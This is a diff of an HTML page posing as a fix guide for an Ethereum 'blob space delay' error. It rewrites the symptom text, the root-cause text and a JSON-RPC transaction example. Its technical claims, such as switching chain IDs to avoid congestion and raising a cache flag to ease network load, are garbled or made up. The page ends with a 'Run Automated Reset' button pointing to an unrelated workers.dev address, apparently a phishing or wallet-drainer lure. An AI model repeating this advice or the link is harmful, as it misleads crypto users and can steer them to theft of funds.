@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: -apple-system;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,29 +41,38 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delays in Ethereum transactions, with error messages indicating a "blob space delay" on the Ethereum network.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary backlog in the Ethereum blob storage system, which is used for storing and retrieving data associated with transactions.</li>
+<li>The error occurs due to excessive blob data being stored on the Ethereum blockchain, causing network congestion and slowing down transaction processing times.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize the transaction: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '1 ether', gas: '2000000'})</code></li>
-<li>Adjust the transaction nonce to bypass stuck transactions:</li>
+<li>Increase the <code>--http.cache.size</code> parameter to optimize caching and reduce the load on the network.</li>
+<li>Use a custom <code>eth.chainID</code> to specify a different chain and potentially avoid congested networks.</li>
+<li>Adjust the <code>gas</code> settings to prioritize transactions and reduce wait times, as shown in the following example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>console<span class="w"> </span>--exec<span class="w"> </span><span class="s2">&quot;eth.sendTransaction({from: &#39;0x...&#39;, to: &#39;0x...&#39;, value: &#39;1 ether&#39;, nonce: &#39;10&#39;})&quot;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gasPrice&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Use a third-party service to monitor and manage transaction queues for optimal performance</li>
-</ul>
-<p>For optimal results, consider using an external console for advanced troubleshooting. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node (geth or parity) installed and running</li>
-<li>Familiarity with Ethereum transaction syntax and gas management</li>
-<li>Access to an Ethereum wallet or account with sufficient balance</li>
+<li>Basic understanding of Ethereum network architecture</li>
+<li>Familiarity with command-line interfaces and JSON formatting</li>
+<li>Access to a compatible Ethereum client or node</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
